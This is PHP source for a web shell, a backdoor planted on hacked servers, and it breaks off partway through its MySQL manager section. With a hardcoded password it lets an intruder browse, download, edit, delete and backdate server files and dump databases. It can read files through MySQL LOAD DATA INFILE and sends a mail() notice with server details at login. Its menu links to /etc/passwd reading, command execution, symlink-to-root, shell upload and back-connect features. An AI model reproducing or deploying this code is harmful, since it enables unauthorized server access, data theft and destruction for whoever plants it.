<?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime     = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)) . '/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0);
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
@set_time_limit(0);
foreach (array(
    '_GET',
    '_POST'
) as $_request) {
    foreach ($$_request as $_key => $_value) {
        if ($_key{0} != '_') {
            if (IS_GPC) {
                $_value = s_array($_value);
            }
            $$_key = $_value;
        }
    }
}
$admin                 = array();
$admin['check']        = true;
$admin['pass']         = 'D4BOS';
$admin['cookiepre']    = '';
$admin['cookiedomain'] = '';
$admin['cookiepath']   = '/';
$admin['cookielife']   = 86400;
if ($charset == 'utf8') {
    header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
    header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
    header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
    header("content-Type: text/html; charset=iso-8859-2");
}
$self      = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();
if ($action == "logout") {
    scookie('kyobin', '', -86400 * 365);
    p('<meta http-equiv="refresh" content="0;URL=' . $self . '">');
    p('<body background=black>');
    exit;
}
if ($admin['check']) {
    if ($doing == 'login') {
        if ($admin['pass'] == $password) {
            scookie('kyobin', $password);
            $time_shell     = "" . date("d/m/Y - H:i:s") . "";
            $ip_remote      = $_SERVER["REMOTE_ADDR"];
            $from_shellcode = 'shell@' . gethostbyname($_SERVER['SERVER_NAME']) . '';
            $to_email       = 'püh püh log yerleştirmek mi yakıştıramadm ';
			//
            $server_mail    = "" . gethostbyname($_SERVER['SERVER_NAME']) . "  - " . $_SERVER['HTTP_HOST'] . "";
            $linkcr         = "Link: " . $_SERVER['SERVER_NAME'] . "" . $_SERVER['REQUEST_URI'] . " - IP Excuting: $ip_remote - Time: $time_shell";
            $header         = "From: $from_shellcode
Reply-to: $from_shellcode";
            @mail($to_email, $server_mail, $linkcr, $header);
            p('<meta http-equiv="refresh" content="2;URL=' . $self . '">');
            p('<body bgcolor=black>
<BR><BR><div align=center><font color=yellow face=tahoma size=2>Loading<BR><img src=http://t3.gstatic.com/images?q=tbn:ANd9GcRFIQy9oLc9jMWmDY_N_sxjWPyusUWC4igwK2lqBm68aDGcSfKPPA></div>');
            exit;
        } else {
            $err_mess = '<table width=100%><tr><td bgcolor=#0E0E0E width=100% height=24><div align=center><font color=red face=tahoma size=2><blink>Password incorrect, Please try again!!!</blink><BR></font></div></td></tr></table>';
            echo $err_mess;
        }
    }
    if ($_COOKIE['kyobin']) {
        if ($_COOKIE['kyobin'] != $admin['pass']) {
            loginpage();
        }
    } else {
        loginpage();
    }
}
$errmsg = '';
if ($action == 'phpinfo') {
    if (IS_PHPINFO) {
        phpinfo();
    } else {
        $errmsg = 'phpinfo() function has non-permissible';
    }
}
if ($doing == 'downfile' && $thefile) {
    if (!@file_exists($thefile)) {
        $errmsg = 'The file you want Downloadable was nonexistent';
    } else {
        $fileinfo = pathinfo($thefile);
        header('Content-type: application/x-' . $fileinfo['extension']);
        header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
        header('Content-Length: ' . filesize($thefile));
        @readfile($thefile);
        exit;
    }
}
if ($doing == 'backupmysql' && !$saveasfile) {
    dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
    $table  = array_flip($table);
    $result = q("SHOW tables");
    if (!$result)
        p('<h2>' . mysql_error() . '</h2>');
    $filename = basename($_SERVER['HTTP_HOST'] . '_MySQL.sql');
    header('Content-type: application/unknown');
    header('Content-Disposition: attachment; filename=' . $filename);
    $mysqldata = '';
    while ($currow = mysql_fetch_array($result)) {
        if (isset($table[$currow[0]])) {
            $mysqldata .= sqldumptable($currow[0]);
        }
    }
    mysql_close();
    exit;
}
if ($doing == 'mysqldown') {
    if (!$dbname) {
        $errmsg = ' dbname';
    } else {
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (!file_exists($mysqldlfile)) {
            $errmsg = 'The file you want Downloadable was nonexistent';
        } else {
            $result = q("select load_file('$mysqldlfile');");
            if (!$result) {
                q("DROP TABLE IF EXISTS tmp_angel;");
                q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                q("LOAD DATA LOCAL INFILE '" . addslashes($mysqldlfile) . "' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                $result = q("select content from tmp_angel");
                q("DROP TABLE tmp_angel");
            }
            $row = @mysql_fetch_array($result);
            if (!$row) {
                $errmsg = 'Load file failed ' . mysql_error();
            } else {
                $fileinfo = pathinfo($mysqldlfile);
                header('Content-type: application/x-' . $fileinfo['extension']);
                header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
                header("Accept-Length: " . strlen($row[0]));
                echo $row[0];
                exit;
            }
        }
    }
}
?><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?php
echo "Website : " . $_SERVER['HTTP_HOST'] . "";
?> | <?php
echo "IP : " . gethostbyname($_SERVER['SERVER_NAME']) . "";
?> </title>
<style type="text/css">
body,td{font: 10pt Tahoma;color:gray;line-height: 16px;}

a {color: #808080;text-decoration:none;}
a:hover{color: #f00;text-decoration:underline;}
.alt1 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.alt2 td{border-top:1px solid gray;border-bottom:1px solid gray;background:#f9f9f9;padding:5px 10px 5px 5px;}
.focus td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout1 td{border-top:1px solid gray;border-bottom:0px solid gray;background:#0E0E0E;padding:5px 10px 5px 5px;}
.fout td{border-top:1px solid gray;border-bottom:0px solid gray;background:#202020;padding:5px 10px 5px 5px;}
.head td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:bold;}
.head_small td{border-top:1px solid gray;border-bottom:1px solid gray;background:#202020;padding:5px 10px 5px 5px;font-weight:normal;font-size:8pt;}
.head td span{font-weight:normal;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
input, textarea, button
{
	font-size: 9pt;
	color: #ccc;
	font-family: verdana, sans-serif;
	background-color: #202020;
	border-left: 1px solid #74A202;
	border-top: 1px solid #74A202;
	border-right: 1px solid #74A202;
	border-bottom: 1px solid #74A202;
}
select
{
	font-size: 8pt;
	font-weight: normal;
	color: #ccc;
	font-family: verdana, sans-serif;
	background-color: #202020;
}

</style>
</style>
<script type="text/javascript">
function CheckAll(form) {
	for(var i=0;i<form.elements.length;i++) {
		var e = form.elements[i];
		if (e.name != 'chkall')
		e.checked = form.chkall.checked;
    }
}
function $(id) {
	return document.getElementById(id);
}
function goaction(act){
	$('goaction').action.value=act;
	$('goaction').submit();
}
</script>
</head>
<body onLoad="init()" style="margin:0;table-layout:fixed; word-break:break-all" bgcolor=black background=http://i1124.photobucket.com/albums/l575/givay/th_matrix.gif>
<div border="0" style="position:fixed; width: 100%; height: 25px; z-index: 1; top: 300px; left: 0;" id="loading" align="center" valign="center">
				<table border="1" width="110px" cellspacing="0" cellpadding="0" style="border-collapse: collapse" bordercolor="#003300">
					<tr>
						<td align="center" valign=center>
				 <div border="1" style="background-color: #0E0E0E; filter: alpha(opacity=70); opacity: .7; width: 110px; height: 25px; z-index: 1; border-collapse: collapse;" bordercolor="#006600"  align="center">
				   beklesene moruq <img src="http://i382.photobucket.com/albums/oo263/vnhacker/loading.gif">
				  </div>
				</td>
					</tr>
				</table>
</div>
 <script>
 var ld=(document.all);
  var ns4=document.layers;
 var ns6=document.getElementById&&!document.all;
 var ie4=document.all;
  if (ns4)
 	ld=document.loading;
 else if (ns6)
 	ld=document.getElementById("loading").style;
 else if (ie4)
 	ld=document.all.loading.style;
  function init()
 {
 if(ns4){ld.visibility="hidden";}
 else if (ns6||ie4) ld.display="none";
 }
 </script>
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head_small">
		<td  width=100%>
		<table width=100%><tr class="head_small"><td  width=86px><p><a title=" .:: Warning ! Shell is used to refer not to hack ::. " href="';$self;;echo '"><img src=http://i476.photobucket.com/albums/rr129/thienthantuyet4444/anonymouswallpaper.png></a></p>
	        </td>
		<td>
            
		<span style="float:left;"> <?php echo "Hostname: ".$_SERVER['HTTP_HOST']."";?> | Server IP: <?php echo "<font color=yellow>".gethostbyname($_SERVER['SERVER_NAME'])."</font>";?> | Your IP: <?php echo "<font color=yellow>".$_SERVER['REMOTE_ADDR']."</font>";?>
	  | <a href="http://google.com" target="_blank"><?php echo str_replace('.','','priv8 ');?> </a> | <a href="javascript:goaction('logout');"><font color=red>Logout</font></a></span> <br />

		<?php
$curl_on  = @function_exists('curl_version');
$mysql_on = @function_exists('mysql_connect');
$mssql_on = @function_exists('mssql_connect');
$pg_on    = @function_exists('pg_connect');
$ora_on   = @function_exists('ocilogon');
echo (($safe_mode) ? ("Safe_mod: <b><font color=green>ON</font></b> - ") : ("Safe_mod: <b><font color=red>OFF</font></b> - "));
echo "PHP version: <b>" . @phpversion() . "</b> - ";
echo "cURL: " . (($curl_on) ? ("<b><font color=green>ON</font></b> - ") : ("<b><font color=red>OFF</font></b> - "));
echo "MySQL: <b>";
$mysql_on = @function_exists('mysql_connect');
if ($mysql_on) {
    echo "<font color=green>ON</font></b> - ";
} else {
    echo "<font color=red>OFF</font></b> - ";
}
echo "MSSQL: <b>";
$mssql_on = @function_exists('mssql_connect');
if ($mssql_on) {
    echo "<font color=green>ON</font></b> - ";
} else {
    echo "<font color=red>OFF</font></b> - ";
}
echo "PostgreSQL: <b>";
$pg_on = @function_exists('pg_connect');
if ($pg_on) {
    echo "<font color=green>ON</font></b> - ";
} else {
    echo "<font color=red>OFF</font></b> - ";
}
echo "Oracle: <b>";
$ora_on = @function_exists('ocilogon');
if ($ora_on) {
    echo "<font color=green>ON</font></b>";
} else {
    echo "<font color=red>OFF</font></b><BR>";
}
echo "Disable functions : <b>";
if ('' == ($df = @ini_get('disable_functions'))) {
    echo "<font color=green>NONE</font></b><BR>";
} else {
    echo "<font color=red>$df</font></b><BR>";
}
echo "<font color=white>Uname -a</font>: " . @substr(@php_uname(), 0, 120) . "<br>";
echo "<font color=white>Server</font>: " . @substr($SERVER_SOFTWARE, 0, 120) . " - <font color=white>id</font>: " . @getmyuid() . "(" . @get_current_user() . ") - uid=" . @getmyuid() . " (" . @get_current_user() . ") gid=" . @getmygid() . "(" . @get_current_user() . ")<br>";
?></td></tr></table></td>
	</tr>
	<tr class="alt1">
		<td  width=10%><a href="javascript:goaction('file');">Manager</a> |
			<a href="javascript:goaction('sqladmin');">SQL</a> 
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('dumper');">Dumper</a><?php
}
?> |
			<a href="javascript:goaction('changepas');">Changes</a>
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('etcpwd');">/etc/passwd</a> <?php
}
?>
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('newcommand');">Command</a> <?php
}
?>
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('error.log');">Creat CGI</a><?php
}
?>
            <?php
if (!IS_WIN) {
?> | <a href="error/error.log" target="_blank">Open CGI</a><?php
}
?>
            <?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('symroot');">Sym Root</a><?php
}
?>
            <?php
if (!IS_WIN) {
?> | <a href="sym/" target="_blank">Open Sym </a><?php
}
?>
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('bypass');">By Pass</a><?php
}
?> 
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('upshell');">Up shell</a><?php
}
?>
            <?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('leech');">Leech</a><?php
}
?>   
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('backconnect');">Back</a><?php
}
?>
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('command');">Win</a> <?php
}
?> 
			<?php
if (!IS_WIN) {
?> | <a href="javascript:goaction('reverseip');">Reverse </a><?php
}
?> 
            </td>
	</tr>
</table>
<table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>
<?php
formhead(array(
    'name' => 'goaction'
));
makehide('action');
formfoot();
$errmsg && m($errmsg);
!$dir && $dir = '.';
$nowpath = getPath(SA_ROOT, $dir);
if (substr($dir, -1) != '/') {
    $dir = $dir . '/';
}
$uedir = ue($dir);
if (!$action || $action == 'file') {
    $dir_writeable = @is_writable($nowpath) ? 'Writable' : 'Non-writable';
    if ($doing == 'deldir' && $thefile) {
        if (!file_exists($thefile)) {
            m($thefile . ' directory does not exist');
        } else {
            m('Directory delete ' . (deltree($thefile) ? basename($thefile) . ' success' : 'failed'));
        }
    } elseif ($newdirname) {
        $mkdirs = $nowpath . $newdirname;
        if (file_exists($mkdirs)) {
            m('Directory has already existed');
        } else {
            m('Directory created ' . (@mkdir($mkdirs, 0777) ? 'success' : 'failed'));
            @chmod($mkdirs, 0777);
        }
    } elseif ($doupfile) {
        m('File upload ' . (@copy($_FILES['uploadfile']['tmp_name'], $uploaddir . '/' . $_FILES['uploadfile']['name']) ? 'success' : 'failed'));
    } elseif ($editfilename && $filecontent) {
        $fp = @fopen($editfilename, 'w');
        m('Save file ' . (@fwrite($fp, $filecontent) ? 'success' : 'failed'));
        @fclose($fp);
    } elseif ($pfile && $newperm) {
        if (!file_exists($pfile)) {
            m('The original file does not exist');
        } else {
            $newperm = base_convert($newperm, 8, 10);
            m('Modify file attributes ' . (@chmod($pfile, $newperm) ? 'success' : 'failed'));
        }
    } elseif ($oldname && $newfilename) {
        $nname = $nowpath . $newfilename;
        if (file_exists($nname) || !file_exists($oldname)) {
            m($nname . ' has already existed or original file does not exist');
        } else {
            m(basename($oldname) . ' renamed ' . basename($nname) . (@rename($oldname, $nname) ? ' success' : 'failed'));
        }
    } elseif ($sname && $tofile) {
        if (file_exists($tofile) || !file_exists($sname)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            m(basename($tofile) . ' copied ' . (@copy($sname, $tofile) ? basename($tofile) . ' success' : 'failed'));
        }
    } elseif ($curfile && $tarfile) {
        if (!@file_exists($curfile) || !@file_exists($tarfile)) {
            m('The goal file has already existed or original file does not exist');
        } else {
            $time = @filemtime($tarfile);
            m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? 'success' : 'failed'));
        }
    } elseif ($curfile && $year && $month && $day && $hour && $minute && $second) {
        if (!@file_exists($curfile)) {
            m(basename($curfile) . ' does not exist');
        } else {
            $time = strtotime("$year-$month-$day $hour:$minute:$second");
            m('Modify file the last modified ' . (@touch($curfile, $time, $time) ? 'success' : 'failed'));
        }
    } elseif ($doing == 'downrar') {
        if ($dl) {
            $dfiles = '';
            foreach ($dl as $filepath => $value) {
                $dfiles .= $filepath . ',';
            }
            $dfiles = substr($dfiles, 0, strlen($dfiles) - 1);
            $dl     = explode(',', $dfiles);
            $zip    = new PHPZip($dl);
            $code   = $zip->out;
            header('Content-type: application/octet-stream');
            header('Accept-Ranges: bytes');
            header('Accept-Length: ' . strlen($code));
            header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_Files.tar.gz');
            echo $code;
            exit;
        } else {
            m('Please select file(s)');
        }
    } elseif ($doing == 'delfiles') {
        if ($dl) {
            $dfiles = '';
            $succ   = $fail = 0;
            foreach ($dl as $filepath => $value) {
                if (@unlink($filepath)) {
                    $succ++;
                } else {
                    $fail++;
                }
            }
            m('Deleted >> success ' . $succ . ' fail ' . $fail);
        } else {
            m('Please select file(s)');
        }
    }
    formhead(array(
        'name' => 'createdir'
    ));
    makehide('newdirname');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'fileperm'
    ));
    makehide('newperm');
    makehide('pfile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'copyfile'
    ));
    makehide('sname');
    makehide('tofile');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'rename'
    ));
    makehide('oldname');
    makehide('newfilename');
    makehide('dir', $nowpath);
    formfoot();
    formhead(array(
        'name' => 'fileopform'
    ));
    makehide('action');
    makehide('opfile');
    makehide('dir');
    formfoot();
    $free = @disk_free_space($nowpath);
    !$free && $free = 0;
    $all = @disk_total_space($nowpath);
    !$all && $all = 0;
    $used         = $all - $free;
    $used_percent = @round(100 / ($all / $free), 2);
    p('<font color=yellow face=tahoma size=2><B>File Manager</b> </font> Current disk free <font color=red>' . sizecount($free) . '</font> of <font color=red>' . sizecount($all) . '</font> (<font color=red>' . $used_percent . '</font>%)</font>');
?><table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  <form action="" method="post" id="godir" name="godir">
  <tr>
    <td nowrap>Directory (<?php
    echo $dir_writeable;
?>, <?php
    echo getChmod($nowpath);
?>)</td>
	<td width="100%"><input name="view_writable" value="0" type="hidden" /><input class="input" name="dir" value="<?php
    echo $nowpath;
?>" type="text" style="width:100%;margin:0 8px;"></td>
    <td nowrap><input class="bt" value="GO" type="submit"></td>
  </tr>
  </form>
</table>
<script type="text/javascript">
function createdir(){
	var newdirname;
	newdirname = prompt('directory name:', '');
	if (!newdirname) return;
	$('createdir').newdirname.value=newdirname;
	$('createdir').submit();
}
function fileperm(pfile){
	var newperm;
	newperm = prompt('Current file:'+pfile+'\n new attribute:', '');
	if (!newperm) return;
	$('fileperm').newperm.value=newperm;
	$('fileperm').pfile.value=pfile;
	$('fileperm').submit();
}
function copyfile(sname){
	var tofile;
	tofile = prompt('Original file:'+sname+'\n object file (fullpath):', '');
	if (!tofile) return;
	$('copyfile').tofile.value=tofile;
	$('copyfile').sname.value=sname;
	$('copyfile').submit();
}
function rename(oldname){
	var newfilename;
	newfilename = prompt('Former file name:'+oldname+'\n new filename:', '');
	if (!newfilename) return;
	$('rename').newfilename.value=newfilename;
	$('rename').oldname.value=oldname;
	$('rename').submit();
}
function dofile(doing,thefile,m){
	if (m && !confirm(m)) {
		return;
	}
	$('filelist').doing.value=doing;
	if (thefile){
		$('filelist').thefile.value=thefile;
	}
	$('filelist').submit();
}
function createfile(nowpath){
	var filename;
	filename = prompt('file name:', '');
	if (!filename) return;
	opfile('editfile',nowpath + filename,nowpath);
}
function opfile(action,opfile,dir){
	$('fileopform').action.value=action;
	$('fileopform').opfile.value=opfile;
	$('fileopform').dir.value=dir;
	$('fileopform').submit();
}
function godir(dir,view_writable){
	if (view_writable) {
		$('godir').view_writable.value=1;
	}
	$('godir').dir.value=dir;
	$('godir').submit();
}
</script>
   <?php
    tbhead();
    p('<form action="' . $self . '" method="POST" enctype="multipart/form-data"><tr class="alt1"><td colspan="7" style="padding:5px;">');
    p('<div style="float:right;"><input class="input" name="uploadfile" value="" type="file" /> <input class="" name="doupfile" value="Upload" type="submit" /><input name="uploaddir" value="' . $dir . '" type="hidden" /><input name="dir" value="' . $dir . '" type="hidden" /></div>');
    p('<a href="javascript:godir(\'' . $_SERVER["DOCUMENT_ROOT"] . '\');">WebRoot</a>');
    if ($view_writable) {
        p(' | <a href="javascript:godir(\'' . $nowpath . '\');">View All</a>');
    } else {
        p(' | <a href="javascript:godir(\'' . $nowpath . '\',\'1\');">View Writable</a>');
    }
    p(' | <a href="javascript:createdir();">Create Directory</a> | <a href="javascript:createfile(\'' . $nowpath . '\');">Create File</a>');
    if (IS_WIN && IS_COM) {
        $obj = new COM('scripting.filesystemobject');
        if ($obj && is_object($obj)) {
            $DriveTypeDB = array(
                0 => 'Unknow',
                1 => 'Removable',
                2 => 'Fixed',
                3 => 'Network',
                4 => 'CDRom',
                5 => 'RAM Disk'
            );
            foreach ($obj->Drives as $drive) {
                if ($drive->DriveType == 2) {
                    p(' | <a href="javascript:godir(\'' . $drive->Path . '/\');" title="Size:' . sizecount($drive->TotalSize) . '&#13;Free:' . sizecount($drive->FreeSpace) . '&#13;Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
                } else {
                    p(' | <a href="javascript:godir(\'' . $drive->Path . '/\');" title="Type:' . $DriveTypeDB[$drive->DriveType] . '">' . $DriveTypeDB[$drive->DriveType] . '(' . $drive->Path . ')</a>');
                }
            }
        }
    }
    p('</td></tr></form>');
    p('<tr class="head"><td>&nbsp;</td><td>Filename</td><td width="16%">Last modified</td><td width="10%">Size</td><td width="20%">Chmod / Perms</td><td width="22%">Action</td></tr>');
    $dirdata  = array();
    $filedata = array();
    if ($view_writable) {
        $dirdata = GetList($nowpath);
    } else {
        $dirs = @opendir($dir);
        while ($file = @readdir($dirs)) {
            $filepath = $nowpath . $file;
            if (@is_dir($filepath)) {
                $dirdb['filename']    = $file;
                $dirdb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                $dirdb['dirchmod']    = getChmod($filepath);
                $dirdb['dirperm']     = getPerms($filepath);
                $dirdb['fileowner']   = getUser($filepath);
                $dirdb['dirlink']     = $nowpath;
                $dirdb['server_link'] = $filepath;
                $dirdb['client_link'] = ue($filepath);
                $dirdata[]            = $dirdb;
            } else {
                $filedb['filename']    = $file;
                $filedb['size']        = sizecount(@filesize($filepath));
                $filedb['mtime']       = @date('Y-m-d H:i:s', filemtime($filepath));
                $filedb['filechmod']   = getChmod($filepath);
                $filedb['fileperm']    = getPerms($filepath);
                $filedb['fileowner']   = getUser($filepath);
                $filedb['dirlink']     = $nowpath;
                $filedb['server_link'] = $filepath;
                $filedb['client_link'] = ue($filepath);
                $filedata[]            = $filedb;
            }
        }
        unset($dirdb);
        unset($filedb);
        @closedir($dirs);
    }
    @sort($dirdata);
    @sort($filedata);
    $dir_i = '0';
    foreach ($dirdata as $key => $dirdb) {
        if ($dirdb['filename'] != '..' && $dirdb['filename'] != '.') {
            $thisbg = bg();
            p('<tr class="fout" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'fout\';">');
            p('<td width="2%" nowrap><font face="wingdings" size="3">0</font></td>');
            p('<td><a href="javascript:godir(\'' . $dirdb['server_link'] . '\');">' . $dirdb['filename'] . '</a></td>');
            p('<td nowrap>' . $dirdb['mtime'] . '</td>');
            p('<td nowrap>--</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirchmod'] . '</a> / ');
            p('<a href="javascript:fileperm(\'' . $dirdb['server_link'] . '\');">' . $dirdb['dirperm'] . '</a>' . $dirdb['fileowner'] . '</td>');
            p('<td nowrap><a href="javascript:dofile(\'deldir\',\'' . $dirdb['server_link'] . '\',\'Are you sure will delete ' . $dirdb['filename'] . '? \\n\\nIf non-empty directory, will be delete all the files.\')">Del</a> | <a href="javascript:rename(\'' . $dirdb['server_link'] . '\');">Rename</a></td>');
            p('</tr>');
            $dir_i++;
        } else {
            if ($dirdb['filename'] == '..') {
                p('<tr class=fout>');
                p('<td align="center"><font face="Wingdings 3" size=4>=</font></td><td nowrap colspan="5"><a href="javascript:godir(\'' . getUpPath($nowpath) . '\');">Parent Directory</a></td>');
                p('</tr>');
            }
        }
    }
    p('<tr bgcolor="green" stlye="border-top:1px solid gray;border-bottom:1px solid gray;"><td colspan="6" height="5"></td></tr>');
    p('<form id="filelist" name="filelist" action="' . $self . '" method="post">');
    makehide('action', 'file');
    makehide('thefile');
    makehide('doing');
    makehide('dir', $nowpath);
    $file_i = '0';
    foreach ($filedata as $key => $filedb) {
        if ($filedb['filename'] != '..' && $filedb['filename'] != '.') {
            $fileurl = str_replace(SA_ROOT, '', $filedb['server_link']);
            $thisbg  = bg();
            p('<tr class="fout" onmouseover="this.className=\focus\;" onmouseout="this.className=\fout\;">');
            p('<td width="2%" nowrap><input type="checkbox" value="1" name="dl[' . $filedb['server_link'] . ']"></td>');
            p('<td><a href="' . $fileurl . '" target="_blank">' . $filedb['filename'] . '</a></td>');
            p('<td nowrap>' . $filedb['mtime'] . '</td>');
            p('<td nowrap>' . $filedb['size'] . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:fileperm(\'' . $filedb['server_link'] . '\');">' . $filedb['filechmod'] . '</a> / ');
            p('<a href="javascript:fileperm(\'' . $filedb['server_link'] . '\');">' . $filedb['fileperm'] . '</a>' . $filedb['fileowner'] . '</td>');
            p('<td nowrap>');
            p('<a href="javascript:dofile(\'downfile\',\'' . $filedb['server_link'] . '\');">Down</a> | ');
            p('<a href="javascript:copyfile(\'' . $filedb['server_link'] . '\');">Copy</a> | ');
            p('<a href="javascript:opfile(\'editfile\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
            p('<a href="javascript:rename(\'' . $filedb['server_link'] . '\');">Rename</a> | ');
            p('<a href="javascript:opfile(\'newtime\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Time</a>');
            p('</td></tr>');
            $file_i++;
        }
    }
    p('<tr class="fout1"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Download Select</a> - <a href="javascript:dofile(\'delfiles\');">Delete </a></td><td colspan="4" align="right">' . $dir_i . ' directories / ' . $file_i . ' files</td></tr>');
    p('</form></table>');
} // end dir


?><script type="text/javascript">
function mysqlfile(doing){
	if(!doing) return;
	$('doing').value=doing;
	$('mysqlfile').dbhost.value=$('dbinfo').dbhost.value;
	$('mysqlfile').dbport.value=$('dbinfo').dbport.value;
	$('mysqlfile').dbuser.value=$('dbinfo').dbuser.value;
	$('mysqlfile').dbpass.value=$('dbinfo').dbpass.value;
	$('mysqlfile').dbname.value=$('dbinfo').dbname.value;
	$('mysqlfile').charset.value=$('dbinfo').charset.value;
	$('mysqlfile').submit();
}
</script>
<?php
if ($action == 'sqladmin') {
    !$dbhost && $dbhost = 'localhost';
    !$dbuser && $dbuser = 'root';
    !$dbport && $dbport = '3306';
    $dbform = '<input type="hidden" id="connect" name="connect" value="1" />';
    if (isset($dbhost)) {
        $dbform .= "<input type=\"hidden\" id=\"dbhost\" name=\"dbhost\" value=\"$dbhost\" />\n";
    }
    if (isset($dbuser)) {
        $dbform .= "<input type=\"hidden\" id=\"dbuser\" name=\"dbuser\" value=\"$dbuser\" />\n";
    }
    if (isset($dbpass)) {
        $dbform .= "<input type=\"hidden\" id=\"dbpass\" name=\"dbpass\" value=\"$dbpass\" />\n";
    }
    if (isset($dbport)) {
        $dbform .= "<input type=\"hidden\" id=\"dbport\" name=\"dbport\" value=\"$dbport\" />\n";
    }
    if (isset($dbname)) {
        $dbform .= "<input type=\"hidden\" id=\"dbname\" name=\"dbname\" value=\"$dbname\" />\n";
    }
    if (isset($charset)) {
        $dbform .= "<input type=\"hidden\" id=\"charset\" name=\"charset\" value=\"$charset\" />\n";
    }
    if ($doing == 'backupmysql' && $saveasfile) {
        if (!$table) {
            m('Please choose the table');
        } else {
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            $table = array_flip($table);
            $fp    = @fopen($path, 'w');
            if ($fp) {
                $result = q('SHOW tables');
                if (!$result)
                    p('<h2>' . mysql_error() . '</h2>');
                $mysqldata = '';
                while ($currow = mysql_fetch_array($result)) {
                    if (isset($table[$currow[0]])) {
                        sqldumptable($currow[0], $fp);
                    }
                }
                fclose($fp);
                $fileurl = str_replace(SA_ROOT, '', $path);
                m('Database has success backup to <a href="' . $fileurl . '" target="_blank">' . $path . '</a>');
                mysql_close();
            } else {
                m('Backup failed');
            }
        }
    }
    if ($insert && $insertsql) {
        $keystr = $valstr = $tmp = '';
        foreach ($insertsql as $key => $val) {
            if ($val) {
                $keystr .= $tmp . $key;
                $valstr .= $tmp . "'" . addslashes($val) . "'";
                $tmp = ',';
            }
        }
        if ($keystr && $valstr) {
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("INSERT INTO $tablename ($keystr) VALUES ($valstr)") ? 'Insert new record of success' : mysql_error());
        }
    }
    if ($update && $insertsql && $base64) {
        $valstr = $tmp = '';
        foreach ($insertsql as $key => $val) {
            $valstr .= $tmp . $key . "='" . addslashes($val) . "'";
            $tmp = ',';
        }
        if ($valstr) {
            $where = base64_decode($base64);
            dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
            m(q("UPDATE $tablename SET $valstr WHERE $where LIMIT 1") ? 'Record updating' : mysql_error());
        }
    }
    if ($doing == 'del' && $base64) {
        $where      = base64_decode($base64);
        $delete_sql = "DELETE FROM $tablename WHERE $where";
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        m(q("DELETE FROM $tablename WHERE $where") ? 'Deletion record of success' : mysql_error());
    }
    if ($tablename && $doing == 'drop') {
        dbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (q("DROP TABLE $tablename")) {
            m('Drop table of success');
            $tablename = '';
        } else {
            m(mysql_error());
        }
    }
    $charsets = array(
        '' => 'Default',
        'gbk' => 'GBK',
        'big5' => 'Big5',
        'utf8' => 'UTF-8',
        'latin1' => 'Latin1'
    );
    formhead(array(
        'title' => 'MYSQL Manager'
    ));
    makehide('action', 'sqladmin');
